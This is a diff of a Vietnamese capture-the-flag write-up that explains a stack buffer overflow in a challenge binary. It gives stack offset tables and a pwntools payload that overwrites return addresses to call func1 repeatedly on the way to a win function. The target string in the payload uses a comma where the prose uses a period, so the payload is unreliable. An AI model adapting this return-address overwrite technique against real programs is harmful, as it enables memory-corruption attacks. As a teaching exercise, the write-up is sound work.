@@ -31,11 +31,12 @@ Tiếp theo là hàm `func2`. Hàm này sẽ gán `check4` bằng `1` nếu `che
 ### Exploit
 Vì mục tiêu của chúng ta là các biến `check2`, `check3`, `check4` phải khác `0` nên ta sẽ cố gắng làm thoả các điều kiện để các biến này có được giá trị khác `0`. Ta sẽ lần lượt exploit `check2`, `check3` rồi đến `check4` vì `check4` phụ thuộc vào `check3` và `check3` phụ thuộc vào `check2`. Do đó, thứ tự gọi hàm tương ứng sẽ là `main` -> `func1` -> `func2` -> `win`.  
 
+#### Return về được `func1`
 Đầu tiên là `check2`. Ở `func1`, để `check2 = 1`, ta sẽ truyền chuỗi `I\'m sorry, don\'t leave me. I want you here with me ~~` vào vị trí nào đó trong buffer để biến `local_58` trong hàm `func1` sẽ bằng với chuỗi trên. Lúc này, ta sẽ có `check2 == 1` vì `strcmp` sẽ trả về `0` nếu 2 chuỗi bằng nhau. Vậy nếu ta gọi lại `func1` lần nữa, `check2` lúc này sẽ có giá trị là `1`. Tiếp theo, ta cần truyền giá trị `0x20010508` vào vị trí nào đó trên buffer để khi hàm truy xuất đến `param_1` sẽ lấy được giá trị `0x20010508` và làm thoả mãn điều kiện.  
 
 Sau khi debug, ta có được bảng sau:  
 
-| Object | Address on stack | Distance from buffer (byte) |
+| Đối tượng | Địa chỉ trên stack | Khoảng cách so với buffer (byte) |
 |---|---|---|
 | buffer | `0xffffd024` | 0 |
 | `return address` của hàm `main` | `0xffffd07c` | 0x58 |
@@ -50,4 +51,33 @@ payload = b'A' * 0x58 + p32(func1_addr)
 
 Khi thử debug với payload trên thì ta thấy được là ta đã return về `func1` thành công.  
 
-![image](https://user-images.githubusercontent.com/44528004/147410362-2037df27-4751-4123-82d7-c0d93bca4d91.png)
+![image](https://user-images.githubusercontent.com/44528004/147410362-2037df27-4751-4123-82d7-c0d93bca4d91.png)  
+
+#### Ghi các giá trị vào buffer để thoả mãn các điều kiện trong `func1`
+Đầu tiên, ta sẽ chèn chuỗi `I\'m sorry, don\'t leave me. I want you here with me ~~` vào buffer. Khi `disass` hàm `func1`, ta thấy được rằng `local_58` nằm tại `ebp - 0x54` (vì `local_58` là đối số thứ 1 của hàm `strcmp` nên sẽ được push vào stack sau).  
+
+![image](https://user-images.githubusercontent.com/44528004/147410799-3ed87810-c625-42f8-9849-14dfd62710ec.png)  
+
+Đồng thời, ta cũng biết được là `param_1` sẽ nằm tại vị trí `ebp + 0x8`.  
+
+![image](https://user-images.githubusercontent.com/44528004/147410911-5fffc63b-078c-4196-a8d6-8d1a4b83410c.png)
+
+
+Ta debug, xem các địa chỉ và lập được bảng sau:
+
+| Đối tượng | Địa chỉ trên stack | Khoảng cách so với buffer (byte) |
+|---|---|---|
+| `ebp` của hàm `func1` | `0xffffd07c` | - |
+| `local_58` | `ebp - 0x54 = 0xffffd07c - 0x54 = 0xffffd028` | 0x4 |
+| `param_1` | `ebp + 0x8 = 0xffffd084` | 0x60 |
+| `return address` của hàm `func1` | `0xffffd080` | 0x5c |
+
+Vậy payload của ta lúc này sẽ là:  
+```python
+e = ELF('./stack_architect')
+func1_addr = e.symbols['func1']
+func2_addr = e.symbols['func2']
+
+payload = b'A' * 0x4 + b'I\'m sorry, don\'t leave me, I want you here with me ~~\x00'
+payload += (0x58 - len(payload)) * b'A' + p32(func1_addr) + p32(func1_addr)
+```
